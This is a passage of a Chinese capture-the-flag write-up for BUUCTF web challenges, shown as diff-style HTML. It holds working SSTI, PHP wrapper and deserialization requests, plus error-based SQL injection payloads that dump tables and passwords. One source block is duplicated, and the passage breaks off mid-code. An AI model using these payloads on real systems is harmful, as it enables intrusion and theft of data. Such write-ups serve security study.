+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">HTTP/1.1 200 OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Server</span>: <span style="color:#ae81ff">openresty</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Date</span>: <span style="color:#ae81ff">Fri, 02 Feb 2024 07:11:48 GMT</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Type</span>: <span style="color:#ae81ff">text/html; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Length</span>: <span style="color:#ae81ff">46</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Connection</span>: <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Etag</span>: <span style="color:#e6db74">&#34;e73bd18a2a11c4a6d40c20c19f7abc8828daed51&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Cache-Control</span>: <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">cache</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">/hints.txt&lt;br&gt;md5(cookie_secret+md5(filename))</span>
+</span></span></code></pre></div><p>在各个地方尝试STTI，最后在error页面拿到cookie_secret，handler是Tornado最重要的对象，信息基本都在他身上</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">GET /error?msg={{handler.application.settings}} HTTP/1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Host</span>: <span style="color:#ae81ff">04183e51</span>-<span style="color:#ae81ff">6c5a-4db6-8607-f71a4ca0354a.node5.buuoj.cn:81</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">User-Agent</span>: <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Accept</span>: <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Accept-Language</span>: <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Accept-Encoding</span>: <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Connection</span>: <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Upgrade-Insecure-Requests</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">HTTP/1.1 200 OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Server</span>: <span style="color:#ae81ff">openresty</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Date</span>: <span style="color:#ae81ff">Fri, 02 Feb 2024 07:42:26 GMT</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Type</span>: <span style="color:#ae81ff">text/html; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Length</span>: <span style="color:#ae81ff">225</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Connection</span>: <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Etag</span>: <span style="color:#e6db74">&#34;e9d687ab39303c59dbcec9e081a1a5d2f531f21e&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Cache-Control</span>: <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">cache</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">&lt;html&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">&lt;head&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">&lt;style&gt;body{font-size: 30px;}&lt;/style&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">&lt;/head&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">&lt;body&gt;{&amp;#39;autoreload&amp;#39;: True, &amp;#39;compiled_template_cache&amp;#39;: False, &amp;#39;cookie_secret&amp;#39;: &amp;#39;9a6fccf5-2228-4cae-9759-59b111eb39e7&amp;#39;}&lt;/body&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">&lt;/html&gt;</span>
+</span></span></code></pre></div><h2 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</h2>
+<p>绕过后进行反序列化</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>  
+</span></span><span style="display:flex;"><span>$text <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;text&#34;</span>];
+</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;file&#34;</span>];
+</span></span><span style="display:flex;"><span>$password <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;password&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($text)<span style="color:#f92672">&amp;&amp;</span>(<span style="color:#a6e22e">file_get_contents</span>($text,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;welcome to the zjctf&#34;</span>)){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&lt;h1&gt;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">file_get_contents</span>($text,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/h1&gt;&lt;/br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag/&#34;</span>,$file)){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Not now!&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>(); 
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span>($file);  <span style="color:#75715e">//useless.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $password <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($password);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $password;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
+</span></span></span></code></pre></div><p>先要对第一个判断进行绕过，已知没有包含这个内容的文件，使用需要使用伪协议构造内容，可以使用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">php://input，结合POST传参进行构造，如下</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">POST /?text=php://input HTTP/1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Host</span>: <span style="color:#ae81ff">bc9b97c7-289a-4345-8882-c772d7707103.node5.buuoj.cn:81</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">User-Agent</span>: <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Accept</span>: <span style="color:#75715e">*/*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Accept-Language</span>: <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Accept-Encoding</span>: <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Type</span>: <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Cache</span>: <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">cache</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Length</span>: <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Origin</span>: <span style="color:#ae81ff">moz-extension://7e8bf9cd-f227-44fd-a6f5-66eb975a6d16</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Connection</span>: <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">welcome to the zjctf</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">data://text/plain;base64,SSBsb3ZlIFBIUAo=</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">data://text/plain,sadsadasds</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">data://是一个流封装协议，可以不借助文件直接把内容包含在php文件中，如下</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= HTTP/1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Host</span>: <span style="color:#ae81ff">bc9b97c7-289a-4345-8882-c772d7707103.node5.buuoj.cn:81</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">User-Agent</span>: <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Accept</span>: <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Accept-Language</span>: <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Accept-Encoding</span>: <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Connection</span>: <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Upgrade-Insecure-Requests</span>: <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>第二个判断是防止非预期解法，根据提示包含useless.php文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Flag</span>{  <span style="color:#75715e">//flag.php  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> $file;  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __tostring(){  
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>)){  
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>); 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (<span style="color:#e6db74">&#34;U R SO CLOSE !///COME ON PLZ&#34;</span>);
+</span></span><span style="display:flex;"><span>        }  
+</span></span><span style="display:flex;"><span>    }  
+</span></span><span style="display:flex;"><span>}  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">  
+</span></span></span></code></pre></div><p>根据提示falg在flag.php中，所以构造对于类</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Flag</span>
+</span></span><span style="display:flex;"><span>{  <span style="color:#75715e">//flag.php  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> $file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __tostring()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (<span style="color:#e6db74">&#34;U R SO CLOSE !///COME ON PLZ&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$flag <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Flag</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($flag);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// O:4:&#34;Flag&#34;:1:{s:4:&#34;file&#34;;s:8:&#34;flag.php&#34;;}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h2 id="极客大挑战-2019hardsql">[极客大挑战 2019]HardSQL</h2>
+<p>先一个个试，或者直接Fuzz跑一下，看看回显，最后发现是报错注入，不过过滤了很多关键字，也可以Fuzz一下，看看有什么没被过滤的</p>
+<p>过滤了空格所以payload都使用括号来代替，过滤=号使用like代替，报错注入可以使用extractvalue、updatexml这两个方法来利用，都是利用参数类型错误达到效果payload基本相似</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">sql</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select * from user where username=&#39;$username&#39; and password=&#39;$password&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- updatexml--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- extractvalue --
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#39;or(extractvalue(0x0a,concat(0x0a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())))))%23&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#39;or(extractvalue(0x0a,concat(0x0a,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())))))%23&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#39;or(extractvalue(0x0a,concat(0x0a,(select(group_concat(right(password,25)))from(H4rDsq1)))))%23&#34;</span>
+</span></span></code></pre></div><h2 id="mrctf2020ez_bypass">[MRCTF2020]Ez_bypass</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!--</span> <span style="color:#a6e22e">I</span> <span style="color:#a6e22e">put</span> <span style="color:#a6e22e">something</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">F12</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">you</span> <span style="color:#f92672">--&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;flag.php&#39;</span>;
+</span></span><span style="display:flex;"><span>$flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;gg&#39;</span>])<span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;id&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $id<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;id&#39;</span>];
+</span></span><span style="display:flex;"><span>    $gg<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;gg&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">md5</span>($id) <span style="color:#f92672">===</span> <span style="color:#a6e22e">md5</span>($gg) <span style="color:#f92672">&amp;&amp;</span> $id <span style="color:#f92672">!==</span> $gg) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;You got the first step&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;passwd&#39;</span>])) {
+</span></span><span style="display:flex;"><span>            $passwd<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;passwd&#39;</span>];
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_numeric</span>($passwd))
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                 <span style="color:#66d9ef">if</span>($passwd<span style="color:#f92672">==</span><span style="color:#ae81ff">1234567</span>)
+</span></span><span style="display:flex;"><span>                 {
+</span></span><span style="display:flex;"><span>                     <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Good Job!&#39;</span>;
+</span></span><span style="display:flex;"><span>                     <span style="color:#a6e22e">highlight_file</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>);
+</span></span><span style="display:flex;"><span>                     <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;By Retr_0&#39;</span>);
+</span></span><span style="display:flex;"><span>                 }
+</span></span><span style="display:flex;"><span>                 <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                 {
+</span></span><span style="display:flex;"><span>                     <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;can you think twice??&#34;</span>;
+</span></span><span style="display:flex;"><span>                 }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;You can not get it !&#39;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;only one way to get the flag&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;You are not a real hacker!&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Please input first&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;!-- Please input first --&gt;
+</span></span></span></code></pre></div><p>简单的绕过，先是数组绕过，后是数字加字符串拼接绕过</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!--</span> <span style="color:#a6e22e">I</span> <span style="color:#a6e22e">put</span> <span style="color:#a6e22e">something</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">F12</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">you</span> <span style="color:#f92672">--&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;flag.php&#39;</span>;
+</span></span><span style="display:flex;"><span>$flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;gg&#39;</span>])<span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;id&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $id<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;id&#39;</span>];
+</span></span><span style="display:flex;"><span>    $gg<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;gg&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">md5</span>($id) <span style="color:#f92672">===</span> <span style="color:#a6e22e">md5</span>($gg) <span style="color:#f92672">&amp;&amp;</span> $id <span style="color:#f92672">!==</span> $gg) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;You got the first step&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;passwd&#39;</span>])) {
+</span></span><span style="display:flex;"><span>            $passwd<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;passwd&#39;</span>];
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_numeric</span>($passwd))
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                 <span style="color:#66d9ef">if</span>($passwd<span style="color:#f92672">==</span><span style="color:#ae81ff">1234567</span>)
+</span></span><span style="display:flex;"><span>                 {
+</span></span><span style="display:flex;"><span>                     <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Good Job!&#39;</span>;
+</span></span><span style="display:flex;"><span>                     <span style="color:#a6e22e">highlight_file</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>);
+</span></span><span style="display:flex;"><span>                     <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;By Retr_0&#39;</span>);
+</span></span><span style="display:flex;"><span>                 }
+</span></span><span style="display:flex;"><span>                 <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                 {
+</span></span><span style="display:flex;"><span>                     <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;can you think twice??&#34;</span>;
+</span></span><span style="display:flex;"><span>                 }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;You can not get it !&#39;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;only one way to get the flag&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;You are not a real hacker!&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Please input first&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;!-- Please input first --&gt;
+</span></span></span></code></pre></div><h2 id="网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</h2>
+<p>简单的POP，注意变量为protected</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;flag.php&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileHandler</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $op;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $filename;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $content;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __construct() {
+</span></span><span style="display:flex;"><span>        $op <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#34;</span>;
+</span></span><span style="display:flex;"><span>        $filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/tmpfile&#34;</span>;
+</span></span><span style="display:flex;"><span>        $content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello World!&#34;</span>;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">process</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">process</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">op</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;1&#34;</span>) {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">write</span>();
